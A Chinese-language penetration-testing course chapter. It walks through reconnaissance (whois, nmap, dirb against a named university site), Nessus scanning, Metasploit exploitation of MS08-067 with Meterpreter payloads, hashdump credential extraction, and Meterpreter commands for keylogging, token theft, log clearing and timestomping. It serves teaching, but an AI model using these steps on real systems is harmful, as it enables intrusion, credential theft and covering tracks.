9.1信息收集
信息收集又分为被动信息收集和主动信息收集。很多人不重视信息收集这一环节，其实信息收集对于渗透来说是非常重要的一步，收集的信息越详细对以后渗透测试的影响越大，毫不夸张的说，信息的收集决定着渗透的成功与否。
1. 被动信息收集
被动信息收集也就是说不会与目标服务器做直接的交互、在不被目标系统察觉的情况下，通过搜索引擎、社交媒体等方式对目标外围的信息进行收集，例如：网站的whois信息、DNS信息、管理员以及工作人员的个人信息等等。
搜索引擎查询
搜索引擎都提供了各种各样的搜索指令，可以帮助我们去收集相关的信息，举例如下：
site指令：只显示来自于某个目标域名(dsu.edu) 的相关搜索结果。这时候，就需要用到" site: "指令。使用这条指令， Google /baidu不但会返回与关键字相关的网页，而且只显示来自于某个具体网站的搜索结果。
intitle指令:只有当网页标题包含所搜索的关键字时，它才会出现在搜索结果里。
inurl指令: 在URL中看是否包含指定的关键字，在目标网站的管理或设置页面方面极其有用。
这些命令都可以组合使用，比如：inurl:id= site:nankai.edu.cn
IP查询
想得到一个域名对应的IP地址，只要用ping命令ping一下域名就可以了：

当然，淘宝也使用了CDN，所以上面图片中得到的IP不是真实web服务器的IP地址，那么如何得到真实服务器的IP呢？
告诉大家个小窍门：不妨把“www”去掉，只ping下taobao.com试试

结果不一样了吧？因为一级域名没有被解析到cdn服务器上，很多使用了cdn服务器的站点都是这样。
whois信息收集
在linux系统下有一个命令：whois，可以查询目标域名的whois信息，用法很简单，如下图所示：

可以查询到域名以及域名注册人的相关信息，例如：域名注册商、DNS服务器地址、联系电话、邮箱、姓名、地址等。
也可以使用一些在线工具，如：http://whois.chinaz.com/

DNS信息收集
还可以用linux下的host命令去查询dns服务器，具体命令格式为：
host -t ns xxx.com
例如对百度域名的dns服务器进行查询，如下图：

     旁站查询
旁站也就是和目标网站处于同一服务器的站点，有些情况下，在对一个网站进行渗透时，发现网站安全性较高，久攻不下，那么我们就可以试着从旁站入手，等拿到一个旁站webshell看是否有权限跨目录，如果没有，继续提权拿到更高权限之后回头对目标网站进行渗透，可以用下面的方式收集旁站：
通过bing搜索引擎
使用IP:%123.123.123.123格式搜索存在于目标ip上的站点，如下图：


这样便能够得到一些同服务器的其它站点。
也可以使用在线工具：http://s.tool.chinaz.com/same

2. 主动信息收集
主动信息收集和被动信息收集相反，主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息。 
发现主机
nmap是一个十分强大的网络扫描器，集成了许多插件，也可以自行开发。下面的一些内容我们就用nmap做演示。 
首先，使用nmap扫描下网络内存在多少台在线主机：
nmap -sP 192.168.1.* 或 nmap -sP 192.168.1.0/24

-sP参数含义是使用ping探测网络内存活主机，不做端口扫描。 
端口扫描
-p参数可以指定要扫描目标主机的端口范围，如，要扫描目标主机在端口范围1~65535开放了哪些端口：

指纹探测
指纹探测就是对目标主机的系统版本、服务版本、以及目标站点所用的应用程序版本进行探测，为漏洞发现做铺垫。
-O参数可以对目标主机的系统以及其版本做探测：

这样我们就得到目标主机所运行的系统为windows xp。  
使用NMAP对系统做扫描时，常用的一个组合是：
Nmap -sS -sV - O xxx.xxx.xxx.xxx
其中 -sS参数的作用是SYN扫描，-sV的作用是探测详细的服务版本信息，-O是探测系统指纹。效果如下图：

Maltego
Maltego是一个开源的取证工具。它可以挖掘和收集信息。Maltego是一个图形界面，可以得到目标的网络拓扑及相关的各类信息，本教材省略，感兴趣者可自学。
WEB指纹探测
探测WEB容器的指纹信息方法很多，比如，随意提交一个错误页面，比如Apache、iis、nginx的默认的错误页面都是不同的，而且不同版本的错误页面也是不同的，如下：

可以看到版本为asp.net。
    也可以用Nmap之类的扫描器对web服务器的版本进行探测，nmap的-sV参数就可以达到这个目的。  
Web敏感目录扫描
WEB目录扫描也就是通过一些保存着敏感路径的字典（如：后台路径、在线编辑器路径、上传路径、备份文件等），对于一次网站渗透来说，对目录进行暴力猜解是前期阶段必不可少的一个步骤。如果运气好扫到了备份文件之类的，也许会事半功倍。
dirb是一款WEB目录扫描工具，也被集成在kali渗透测试系统中，用法很简单，下面简单做个演示：
目标站点 cc.nankai.edu.cn

需要大家平时多收集web敏感路径的字典。
也有爬虫工具，便于帮助渗透者了解目标web的大概结构，webscarab就是一款强大的web爬行工具，也可以做目录爆破用，还有很多其它功能，比如做xss测试等，java开发的 gui界面用法非常简单，这里就简单做爬虫演示： 
首先打开proxy选项卡中的listener选项卡配置代理端口，IP地址填127.0.0.1，点击start开启代理服务：

接着，打开浏览器，设置代理服务器为127.0.0.1端口为自己在webscarab中设置的端口

配置好代理后，在浏览器中访问目标网站，然后打开webscarab的spider选项卡，选择起始点的请求（目标站点），点击Fecth Tree就可以在messages选项卡中看到请求信息:


在spider窗格中双击自己目标站点前的文件夹图标就可以查看爬到的目录以及文件

信息收集对于一次渗透来说是非常重要的，收集到的信息越多，渗透的成功几率就越大，前期收集到的这些信息对于以后的阶段有着非常重要的意义。
9.2扫描
1. Nessus准备
Nessus基础知识
Nessus号称是世界上最流行的漏洞扫描程序，全世界有超过75000个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus不同于传统的漏洞扫描软件，Nessus可同时在本机或远端上遥控，进行系统的漏洞分析扫描。对渗透测试人员来说，Nessus是必不可少的工具之一。
安装Nessus工具
为了顺利的使用Nessus工具，则必须要将该工具安装在系统中。Nessus工具不仅可以在电脑上使用，而且还可以在手机上使用。本节将介绍在不同操作系统平台及手机上安装Nessus工具的方法。
获取Nessus软件包
在安装Nessus工具之前，首先要获取该工具的安装包。而且，Nessus工具安装后，必须要激活才可使用。所以，下面将分别介绍获取Nessus安装包和激活码的方法。
1.获取Nessus安装包
Nessus的官方下载地址是：
http://www.tenable.com/products/nessus/select-your-operating-system
在浏览器中输入以上地址，将打开如图所示的界面。

选择Nessus Home，进行下载。
从该界面可以看到Nessus有两个版本，分别是Home（家庭版）和Professional（专业版）。这两个版本的区别如下所示：
家庭版：家庭版是免费的，主要是供非商业性或个人使用。该版比较适合个人使用，并且可以用于非专业的环境。
专业版：专业版是需要付费的。但是，可以免费使用七天。该版主要是供商业人士使用。它包括技术支持或附加功能，如无线并发连接等。
对于大部分人来说，家庭版的功能都可以满足。所以，这里选择下载家庭版。在该界面单击Nessus Home下面的Download按钮，将显示如图所示的界面。
 
2.获取激活码
在使用Nessus之前，必须先激活该服务才可使用。如果要激活Nessus服务，则需要到官网获取一个激活码。下面将介绍获取激活码的方法。具体操作步骤如下所示：
（1）在浏览器中输入以下地址：
http://www.nessus.org/products/nessus/nessus-plugins/obtain-an-activation-code
成功访问以上链接后，将打开如图所示的界面。

（2）在该界面单击Nessus Home Free下面的Register Now按钮，在该界面填写一些信息，为了获取激活码。在该界面First Name和Last Name文本框中，用户可以任意填写。但是，Email下的文本框必须填写一个合法的邮件地址，用来获取邮件。当以上信息设置完成后，单击Register按钮。接下来，将会在注册的邮箱中收到一份关于Nessus的邮件。进入邮箱打开收到的邮件，将会看到一串数字，类似XXXX-XXXX-XXXX-XXXX，即激活码。
（3）当成功安装Nessus工具后，就可以使用以上获取到的激活码来激活该服务了。
Nessus工具在Kali Linux下安装
从官网上下载安装包。本例中下载的安装包文件名为Nessus-6.6.2-debian6_i386.deb。
默认下载的位置是Downloads，进入该目录：

安装命令：dpkg –I Nessus-6.6.2-debian6_i386.deb

启动Nessus：/etc/init.d/nessusd start
/etc/init.d/这个是目录，下面存放着很多的服务程序（当然都是可执行的）。

打开浏览器，输入网址：https://127.0.0.1:8834
        
注意：
（1）第一次登陆将需要根据提示，进行注册获取激活码等，这里省略；
（2）第一次登陆，会有风险提示，这个时候选择类似“我知道风险”的选项，进行确认就可以了；
（3）Nessus在安装的时候，网络一定要确保顺畅，否则经常会出现下载不完整、在线更新无法完成等情况，如果出现此类情况，一种解决办法就是手动更新Nessus，即在控制台中，运行命令：/opt/nessus/sbin/nessuscli update --plugins-only。完成更新后，重新启动Nessus，即使用命令：/etc/init.d/nessusd restart。然后重新登录，即可解决问题。
2. Nessus扫描
如果第一次扫描，需要点New Scan，新建一个扫描：

 
一般的XP系统扫描，只需要选择第一个“Advanced Scan”就可以了。

在Targets输入目标IP地址即可，保存后即可运行：

一旦运行后，双击该扫描选项，可以进入如下界面：

双击漏洞，进入详细列表，如下：


9.3漏洞利用
发现目标机存在MS08-067的漏洞，接下来通过msfconsole中的search命令查找该漏洞的渗透攻击模块：

然后使用use命令选用该模块、并使用show options来查看选项：

可以看到options中RHOST并没有被设置，使用set进行设置后重新查看如下：

最后，利用exploit命令进行利用：

利用后，可以看到Windows XP系统中出现：

    也就是，目标系统出现了溢出。
以上的情况是，仅仅使用了模块，重现了溢出漏洞。如果使用攻击载荷，则可以对目标系统实施更进一步的攻击，比如植入木马，获取目标主机的控制权等。
在使用该模块后，可以使用show payloads指令来查看所有的攻击载荷（payload）：

可以看到很多的攻击载荷，常见载荷有：
reverse_tcp：path : payload/windows/meterpreter/reverse_tcp，反向连接shell,使用起来很稳定。需要设置LHOST。
bind_tcp：path : payload/windows/meterpreter/bind_tcp，正向连接shell。需要设置RHOST。
我们选用windows/meterpreter/bind_tcp，并使用命令设置该攻击载荷：set payload windows/meterpreter/bind_tcp，然后使用show options，如下：

可以看到，需要设置RHOST，使用set命令设置：set RHOST 192.168.32.131。
注意，ms08_067对漏洞版本特别有效，因此，务必需要设置版本。通过show targets命令查看可选的目标操作系统类型，并通过set target命令选择合适的目标操作系统。
使用命令show targets查看版本如下：

由于目标机器的操作系统是Windows XP SP3简化中文版，因此，版本号为34，则设置版本号 set target 34之后，进行漏洞利用，如下：

很显然，利用成功，进入meterpreter界面。
事实上，在利用exploit进行漏洞利用前，可以通过check命令查看目标机是否可攻击， 渗透成功后，会返回一个meterpreter shell。 
Meterpreter是Metasploit框架中的一个杀手锏，通过作为漏洞溢出后的攻击载荷所使用，攻击载荷在触发漏洞后返回给我们一个控制通道。
9.4后渗透攻击    
1. 挖掘用户名和密码
微软Windows系统存储哈希值的方式一般为LAN Manger(LM)、NT LAN Manger(NTLM),或NT LAN Manger v2(NTLMv2)。
在LM存储方式中，当用户首次输入密码或更新密码的时候，密码被转换为哈希值。由于哈希长度的限制，将密码分为7个字符一组的哈希值。以password123456的密码为例，哈希值以passwor和d123456的方式存储，所以攻击者只需要简单地破解7个字符一组的密码，而不是原始的14个字符。而NTLM的存储方式跟密码长度无光，密码password123456将作为整体转换为哈希值存储。
我们可以通过Meterpreter中的hashdump模块来提取系统的用户名和密码哈希值。

例如，UID为500的Administrator用户密码的哈希值如下。其中第一个哈希是LM哈希值，第二个则是NTLM哈希值。
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    得到这些HASH值之后，一方面可以利用工具对这些HASH值进行暴力破解，得到其明文，另一方面，在一些渗透脚本中，以这些HASH值作为输入，使其完成对目标主机的登录。感兴趣的同学，可以自行开展进一步的研究。
2. 获取控制权
利用shell命令可以获得目标主机的控制台，有了控制台，就可以对目标系统进行任意文件操作，也可以执行各类DOS命令。
如下：


具体的Meterpreter命令如下：
第1步：核心命令
? – 帮助菜单
background – 将当前会话移动到背景
bgkill – 杀死一个背景 meterpreter 脚本
bglist – 提供所有正在运行的后台脚本的列表
bgrun – 作为一个后台线程运行脚本
channel – 显示活动频道
close – 关闭通道
exit – 终止 meterpreter 会话
help – 帮助菜单
interact – 与通道进行交互
irb – 进入 Ruby 脚本模式
migrate – 移动到一个指定的 PID 的活动进程
quit – 终止 meterpreter 会话
read – 从通道读取数据
run – 执行以后它选定的 meterpreter 脚本
use – 加载 meterpreter 的扩展
write – 将数据写入到一个通道
第2步：文件系统命令
cat -读取并输出到标准输出文件的内容
cd -更改目录对受害人
del -删除文件对受害人
download-从受害者系统文件下载
edit-用 vim编辑文件
getlwd -打印本地目录
getwd -打印工作目录
lcd -更改本地目录
lpwd -打印本地目录
ls -列出在当前目录中的文件列表
mkdir -在受害者系统上的创建目录
pwd -输出工作目录
rm -删除文件
rmdir -受害者系统上删除目录
upload-从攻击者的系统往受害者系统上传文件
第 3 步： 网络命令
ipconfig -显示网络接口的关键信息，包括 IP 地址等。
portfwd -端口转发
route -查看或修改受害者路由表
第 4 步： 系统命令
clearav -清除了受害者的计算机上的事件日志
drop_token -被盗的令牌
execute-执行命令
getpid -获取当前进程 ID (PID)
getprivs -尽可能获取尽可能多的特权
getuid -获取作为运行服务器的用户
kill -终止指定 PID 的进程
ps -列出正在运行的进程
reboot-重新启动受害人的计算机
reg -与受害人的注册表进行交互
rev2self -在受害者机器上调用 RevertToSelf()
shell -在受害者计算机上打开一个shell
shutdown-关闭了受害者的计算机
steal_token -试图窃取指定的 (PID) 进程的令牌
sysinfo -获取有关受害者计算机操作系统和名称等的详细信息
第 5 步： 用户界面命令
enumdesktops -列出所有可访问台式机
getdesktop -获取当前的 meterpreter 桌面
idletime -检查长时间以来，受害者系统空闲进程
keyscan_dump -键盘记录软件的内容转储
keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件
keyscan_stop -停止键盘记录软件
screenshot-抓去 meterpreter 桌面的屏幕截图
set_desktop -更改 meterpreter 桌面
uictl -启用用户界面组件的一些控件
第 6 步： 特权升级命令
getsystem -获得系统管理员权限
第 7 步： 密码转储命令
hashdump -抓去哈希密码 (SAM) 文件中的值
请注意 hashdump 会可以跳过杀毒软件，但现在有两个脚本，都更加隐蔽，”run hashdump”和”run smart_hashdump”。查找更多关于那些在我即将举行的 meterpreter 脚本作弊。
第 8 步： Timestomp 命令
timestomp -操作修改，访问，并创建一个文件的属性




